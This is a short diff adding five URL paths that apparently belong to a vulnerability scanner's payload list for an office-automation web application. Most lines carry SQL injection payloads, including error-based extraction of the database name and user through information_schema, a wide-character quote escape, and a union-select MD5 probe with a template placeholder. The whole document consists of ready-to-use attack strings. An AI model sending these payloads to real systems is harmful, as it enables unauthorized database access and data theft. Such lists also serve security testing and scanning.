@@ -1,0 +1,5 @@
+/interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
+/share/handle.php?_GET[module]=1
+/share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27
+/general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php
